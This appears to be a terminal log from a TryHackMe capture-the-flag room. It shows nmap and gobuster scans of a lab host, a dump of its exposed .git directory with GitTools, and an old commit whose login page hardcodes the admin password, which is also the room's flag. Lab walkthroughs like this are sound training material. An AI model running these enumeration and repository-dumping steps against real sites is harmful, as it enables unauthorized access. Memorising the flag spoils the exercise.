@@ -1,0 +1,516 @@
+┌──(kali㉿kali)-[~]
+└─$ nmap -sC 10.10.76.7 -T 4                                                                              255 ⨯
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-03 13:30 EST
+Nmap scan report for 10.10.76.7
+Host is up (0.21s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+| http-git: 
+|   10.10.76.7:80/.git/
+|     Git repository found!
+|_    Repository description: Unnamed repository; edit this file 'description' to name the...
+|_http-title: Super Awesome Site!
+
+Nmap done: 1 IP address (1 host up) scanned in 5.05 seconds
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://10.10.76.7/ -w /usr/share/dirb/wordlists/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.76.7/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/12/03 13:36:08 Starting gobuster in directory enumeration mode
+===============================================================
+/.git/HEAD            (Status: 200) [Size: 23]
+/css                  (Status: 301) [Size: 194] [--> http://10.10.76.7/css/]
+/index.html           (Status: 200) [Size: 6890]                            
+                                                                            
+===============================================================
+2021/12/03 13:36:25 Finished
+===============================================================
+
+┌──(kali㉿kali)-[/usr/share]
+└─$ sudo -i
+[sudo] password for kali: 
+
+┌──(root💀kali)-[~]
+└─# /opt
+                                 
+┌──(root💀kali)-[/opt]
+└─# git clone https://github.com/internetwache/GitTools.git          
+Cloning into 'GitTools'...
+remote: Enumerating objects: 229, done.
+remote: Counting objects: 100% (20/20), done.
+remote: Compressing objects: 100% (16/16), done.
+remote: Total 229 (delta 6), reused 7 (delta 2), pack-reused 209
+Receiving objects: 100% (229/229), 52.92 KiB | 1.76 MiB/s, done.
+Resolving deltas: 100% (85/85), done.
+
+
+┌──(root💀kali)-[/opt/GitTools/Dumper]
+└─# ./gitdumper.sh http://10.10.76.7/.git/ /home/kali/Documents/TryHackMe/gitHappens
+###########
+# GitDumper is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Only for educational purposes!
+###########
+
+
+[*] Destination folder does not exist
+[+] Creating /root/Documents/TryHackMe/gitHappens/.git/
+[+] Downloaded: HEAD
+[-] Downloaded: objects/info/packs
+[+] Downloaded: description
+[+] Downloaded: config
+[-] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[+] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[-] Downloaded: refs/remotes/origin/HEAD
+[-] Downloaded: refs/stash
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
+[-] Downloaded: logs/refs/remotes/origin/HEAD
+[-] Downloaded: info/refs
+[+] Downloaded: info/exclude
+[-] Downloaded: /refs/wip/index/refs/heads/master
+[-] Downloaded: /refs/wip/wtree/refs/heads/master
+[+] Downloaded: objects/d0/b3578a628889f38c0affb1b75457146a4678e5
+[-] Downloaded: objects/00/00000000000000000000000000000000000000
+[+] Downloaded: objects/b8/6ab47bacf3550a5450b0eb324e36ce46ba73f1
+[+] Downloaded: objects/77/aab78e2624ec9400f9ed3f43a6f0c942eeb82d
+[+] Downloaded: objects/f1/4bcee8053e39eeb414053db4ec7b985f65edc8
+[+] Downloaded: objects/9d/74a92581071ae7c4a470ff035e0de4598877e5
+[+] Downloaded: objects/20/9515b2f7cbdfb731d275c4b089e41ba35c3bc8
+[+] Downloaded: objects/5a/35c9b7c787c22f689d0364cf57b013a11561a2
+[+] Downloaded: objects/08/906612dfe6821cebc21794eb85601fc4f54de9
+[+] Downloaded: objects/4a/2aab268541cbcc434e0565b4f4f2deca29ee5f
+[+] Downloaded: objects/7c/578d86a8713b67af2cb1b1d7c524c23cefe7aa
+[+] Downloaded: objects/4e/7178fa5b68fec15e54f2b79ace6f9ce0169e01
+[+] Downloaded: objects/2e/b93ac3534155069a8ef59cb25b9c1971d5d199
+[+] Downloaded: objects/4c/f757268c6824041664d132a29908aa9c362a26
+[+] Downloaded: objects/3a/39b02d3b9d12222bac4737ee67e31403d62f13
+[+] Downloaded: objects/ae/f68b1e25df81a8c96ee4d57b20cc9f7a1ebee5
+[+] Downloaded: objects/d6/df4000639981d032f628af2b4d03b8eff31213
+[+] Downloaded: objects/56/820adbbd5ac0f66f61916122c94ea52937e9b2
+[+] Downloaded: objects/d9/54a99b96ff11c37a558a5d93ce52d0f3702a7d
+[+] Downloaded: objects/06/012255f074d7bc4acc6fadbcff004380b5f83b
+[+] Downloaded: objects/bc/8054d9d95854d278359a432b6d97c27e24061d
+[+] Downloaded: objects/dd/13038df878d41b774ce4fd4552091d46873c25
+[+] Downloaded: objects/8c/94b154aef92380e29a3f16f1a889b56127cf13
+[+] Downloaded: objects/e5/6eaa8e29b589976f33d76bc58a0c4dfb9315b1
+[+] Downloaded: objects/48/926fdeb371c8ba174b1669d102e8c873afabf1
+[+] Downloaded: objects/ce/b8d530ebcf79806dffc981905ec8c2e0d7a65b
+[+] Downloaded: objects/87/bcbcb476578c6cc90ed39f9404292539fe1c9c
+[+] Downloaded: objects/39/5e087334d613d5e423cdf8f7be27196a360459
+[-] Downloaded: objects/40/04c23a71fd6ba9b03ec9cb7eed08471197d843
+[-] Downloaded: objects/19/a865c5442a9d6a7c7cbea070f3cb6aa5106ef8
+[-] Downloaded: objects/0f/679a88dbbaf89ff64cb351a151a5f29819a3c0
+[+] Downloaded: objects/0e/abcfcd62467d64fb30b889e8de5886e028c3ed
+[+] Downloaded: objects/ba/5e4a76e3f7b6c49850c41716f8f1091fbdc84e
+[+] Downloaded: objects/2f/423697bf81fe5956684f66fb6fc6596a1903cc
+[+] Downloaded: objects/e3/8d9df9b13e6499b749e36e064ec30f2fa45657
+[+] Downloaded: objects/0e/0de07611ada4690fc0ea5b5c04721ba6f3fd0d
+[+] Downloaded: objects/66/64f4e548df7591da3728d7662b6376debfce8d
+
+┌──(root💀kali)-[~/Documents]
+└─# exit  
+  
+┌──(kali㉿kali)-[~/Documents/TryHackMe/gitHappens]
+└─$ .git 
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/gitHappens/.git]
+└─$ git log   
+commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -> master, tag: v1.0)
+Author: Adam Bertrand <hydragyrum@gmail.com>
+Date:   Thu Jul 23 22:22:16 2020 +0000
+
+    Update .gitlab-ci.yml
+
+commit 77aab78e2624ec9400f9ed3f43a6f0c942eeb82d
+Author: Hydragyrum <hydragyrum@gmail.com>
+Date:   Fri Jul 24 00:21:25 2020 +0200
+
+    add gitlab-ci config to build docker file.
+
+commit 2eb93ac3534155069a8ef59cb25b9c1971d5d199
+Author: Hydragyrum <hydragyrum@gmail.com>
+Date:   Fri Jul 24 00:08:38 2020 +0200
+
+    setup dockerfile and setup defaults.
+
+commit d6df4000639981d032f628af2b4d03b8eff31213
+Author: Hydragyrum <hydragyrum@gmail.com>
+Date:   Thu Jul 23 23:42:30 2020 +0200
+
+    Make sure the css is standard-ish!
+
+commit d954a99b96ff11c37a558a5d93ce52d0f3702a7d
+Author: Hydragyrum <hydragyrum@gmail.com>
+Date:   Thu Jul 23 23:41:12 2020 +0200
+
+    re-obfuscating the code to be really secure!
+
+commit bc8054d9d95854d278359a432b6d97c27e24061d
+Author: Hydragyrum <hydragyrum@gmail.com>
+Date:   Thu Jul 23 23:37:32 2020 +0200
+
+    Security says obfuscation isn't enough.
+    
+    They want me to use something called 'SHA-512'
+
+commit e56eaa8e29b589976f33d76bc58a0c4dfb9315b1
+Author: Hydragyrum <hydragyrum@gmail.com>
+Date:   Thu Jul 23 23:25:52 2020 +0200
+
+    Obfuscated the source code.
+    
+    Hopefully security will be happy!
+
+commit 395e087334d613d5e423cdf8f7be27196a360459
+Author: Hydragyrum <hydragyrum@gmail.com>
+Date:   Thu Jul 23 23:17:43 2020 +0200
+
+    Made the login page, boss!
+
+commit 2f423697bf81fe5956684f66fb6fc6596a1903cc
+Author: Adam Bertrand <hydragyrum@gmail.com>
+Date:   Mon Jul 20 20:46:28 2020 +0000
+
+    Initial commit
+
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/gitHappens/.git]
+└─$ git show 395e087334d613d5e423cdf8f7be27196a360459
+commit 395e087334d613d5e423cdf8f7be27196a360459
+Author: Hydragyrum <hydragyrum@gmail.com>
+Date:   Thu Jul 23 23:17:43 2020 +0200
+
+    Made the login page, boss!
+
+diff --git a/css/style.css b/css/style.css
+new file mode 100644
+index 0000000..48926fd
+--- /dev/null
++++ b/css/style.css
+@@ -0,0 +1,197 @@
++* {
++  -webkit-font-smoothing: antialiased;
++  text-rendering: optimizeLegibility;
++}
++
++html,
++body {
++  height: 100%;
++}
++
++body {
++  display: -webkit-box;
++  display: flex;
++  -webkit-box-align: center;
++  align-items: center;
++  -webkit-box-pack: center;
++  justify-content: center;
++  -webkit-box-orient: vertical;
++  -webkit-box-direction: normal;
++  flex-direction: column;
++  position: relative;
++  background: linear-gradient(
++    135deg,
++    rgba(36, 46, 77, 0.9),
++    rgba(137, 126, 121, 0.9)
++  );
++  font-family: "Roboto", helvetica, arial, sans-serif;
++  font-size: 1.5em;
++}
++body:before {
++  content: "";
++  position: absolute;
++  top: 0;
++  left: 0;
++  height: 100%;
++  width: 100%;
++  background-image: url(data:image/png;base64,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);
++  opacity: 0.3;
++}
++
++.login-form {
++  width: 100%;
++  padding: 2em;
++  position: relative;
++  background: rgba(0, 0, 0, 0.15);
++}
++.login-form:before {
++  content: "";
++  position: absolute;
++  top: -2px;
++  left: 0;
++  height: 2px;
++  width: 100%;
++  background: -webkit-gradient(
++    linear,
++    left top,
++    right top,
++    from(#35c3c1),
++    to(#00d6b7)
++  );
++  background: linear-gradient(to right, #35c3c1, #00d6b7);
++}
++@media screen and (min-width: 600px) {
++  .login-form {
++    width: 50vw;
++    max-width: 15em;
++  }
++}
++
++.flex-row {
++  display: -webkit-box;
++  display: flex;
++  margin-bottom: 1em;
++}
++
++.lf--label {
++  width: 2em;
++  display: -webkit-box;
++  display: flex;
++  -webkit-box-align: center;
++  align-items: center;
++  -webkit-box-pack: center;
++  justify-content: center;
++  background: #f5f6f8;
++  cursor: pointer;
++}
++
++.lf--input {
++  -webkit-box-flex: 1;
++  flex: 1;
++  padding: 1em;
++  border: 0;
++  color: #8f8f8f;
++  font-size: 1rem;
++}
++.lf--input:focus {
++  outline: none;
++  -webkit-transition: -webkit-transform 0.15s ease;
++  transition: -webkit-transform 0.15s ease;
++  transition: transform 0.15s ease;
++  transition: transform 0.15s ease, -webkit-transform 0.15s ease;
++  -webkit-transform: scale(1.1);
++  transform: scale(1.1);
++}
++
++.lf--submit {
++  display: block;
++  padding: 1em;
++  width: 100%;
++  background: -webkit-gradient(
++    linear,
++    left top,
++    right top,
++    from(#35c3c1),
++    to(#00d6b7)
++  );
++  background: linear-gradient(to right, #35c3c1, #00d6b7);
++  border: 0;
++  color: #fff;
++  cursor: pointer;
++  font-size: 0.75em;
++  font-weight: 600;
++  text-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
++}
++.lf--submit:focus {
++  outline: none;
++  -webkit-transition: -webkit-transform 0.15s ease;
++  transition: -webkit-transform 0.15s ease;
++  transition: transform 0.15s ease;
++  transition: transform 0.15s ease, -webkit-transform 0.15s ease;
++  -webkit-transform: scale(1.1);
++  transform: scale(1.1);
++}
++
++.lf--forgot {
++  margin-top: 1em;
++  color: #00d6b7;
++  font-size: 0.65em;
++  text-align: center;
++  position: relative;
++}
++
++::-webkit-input-placeholder {
++  color: #8f8f8f;
++}
++
++::-moz-placeholder {
++  color: #8f8f8f;
++}
++
++:-ms-input-placeholder {
++  color: #8f8f8f;
++}
++
++::-ms-input-placeholder {
++  color: #8f8f8f;
++}
++
++::placeholder {
++  color: #8f8f8f;
++}
++
++.error {
++  color: red;
++}
++
++.rainbow-text {
++  background-image: repeating-linear-gradient(
++    45deg,
++    violet,
++    indigo,
++    blue,
++    green,
++    yellow,
++    orange,
++    red,
++    violet
++  );
++  text-align: center;
++  background-size: 800% 800%;
++  -webkit-background-clip: text;
++  -webkit-text-fill-color: transparent;
++  font-size: 24px;
++  animation: rainbow 8s ease infinite;
++}
++
++@keyframes rainbow {
++  0% {
++    background-position: 0% 50%;
++  }
++  50% {
++    background-position: 100% 25%;
++  }
++  100% {
++    background-position: 0% 50%;
++  }
++}
+diff --git a/dashboard.html b/dashboard.html
+new file mode 100644
+index 0000000..e38d9df
+--- /dev/null
++++ b/dashboard.html
+@@ -0,0 +1,24 @@
++<!DOCTYPE html>
++<html lang="en">
++  <head>
++    <meta charset="UTF-8" />
++    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
++    <title>Awesome!</title>
++    <link rel="stylesheet" href="/css/style.css" />
++  </head>
++  <body onload="checkCookie()">
++    <p class="rainbow-text">Awesome! Use the password you input as the flag!</p>
++
++    <script>
++      function checkCookie() {
++        if (
++          document.cookie.split(";").some((item) => item.includes("login=1"))
++        ) {
++          console.log('The cookie "login" has "1" for value');
++        } else {
++          window.location.href = "/index.html";
++        }
++      }
++    </script>
++  </body>
++</html>
+diff --git a/index.html b/index.html
+new file mode 100644
+index 0000000..0e0de07
+--- /dev/null
++++ b/index.html
+@@ -0,0 +1,75 @@
++<!DOCTYPE html>
++<html lang="en">
++  <head>
++    <meta charset="UTF-8" />
++    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
++    <title>Super Awesome Site!</title>
++    <link rel="stylesheet" href="/css/style.css">
++  </head>
++  <body>
++    <h1>Login</h1>
++    <form class="login-form" id="login-form">
++     <div class="flex-row">
++         <p class="error" id="error"></p>
++     </div>
++      <div class="flex-row">
++        <label class="lf--label" for="username">
++          <svg x="0px" y="0px" width="12px" height="13px">
++            <path
++              fill="#B1B7C4"
++              d="M8.9,7.2C9,6.9,9,6.7,9,6.5v-4C9,1.1,7.9,0,6.5,0h-1C4.1,0,3,1.1,3,2.5v4c0,0.2,0,0.4,0.1,0.7 C1.3,7.8,0,9.5,0,11.5V13h12v-1.5C12,9.5,10.7,7.8,8.9,7.2z M4,2.5C4,1.7,4.7,1,5.5,1h1C7.3,1,8,1.7,8,2.5v4c0,0.2,0,0.4-0.1,0.6 l0.1,0L7.9,7.3C7.6,7.8,7.1,8.2,6.5,8.2h-1c-0.6,0-1.1-0.4-1.4-0.9L4.1,7.1l0.1,0C4,6.9,4,6.7,4,6.5V2.5z M11,12H1v-0.5 c0-1.6,1-2.9,2.4-3.4c0.5,0.7,1.2,1.1,2.1,1.1h1c0.8,0,1.6-0.4,2.1-1.1C10,8.5,11,9.9,11,11.5V12z"
++            />
++          </svg>
++        </label>
++        <input
++          id="username"
++          name="username"
++          class="lf--input"
++          placeholder="Username"
++          type="text"
++        />
++      </div>
++      <div class="flex-row">
++        <label class="lf--label" for="password">
++          <svg x="0px" y="0px" width="15px" height="5px">
++            <g>
++              <path
++                fill="#B1B7C4"
++                d="M6,2L6,2c0-1.1-1-2-2.1-2H2.1C1,0,0,0.9,0,2.1v0.8C0,4.1,1,5,2.1,5h1.7C5,5,6,4.1,6,2.9V3h5v1h1V3h1v2h1V3h1 V2H6z M5.1,2.9c0,0.7-0.6,1.2-1.3,1.2H2.1c-0.7,0-1.3-0.6-1.3-1.2V2.1c0-0.7,0.6-1.2,1.3-1.2h1.7c0.7,0,1.3,0.6,1.3,1.2V2.9z"
++              />
++            </g>
++          </svg>
++        </label>
++        <input
++          id="password"
++          name="password"
++          class="lf--input"
++          placeholder="Password"
++          type="password"
++        />
++      </div>
++      <input class='lf--submit' type="button" value="LOGIN" onclick="login()" />
++    </form>
++
++   
++
++    <script>
++      function login() {
++        let form = document.getElementById("login-form");
++        console.log(form.elements);
++        let username = form.elements["username"].value;
++        let password = form.elements["password"].value;
++        if (
++          username === "admin" &&
++          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
++        ) {
++          document.cookie = "login=1";
++          window.location.href = "/dashboard.html";
++        } else {
++          document.getElementById("error").innerHTML =
++            "INVALID USERNAME OR PASSWORD!";
++        }
++      }
++    </script>
++  </body>
++</html>
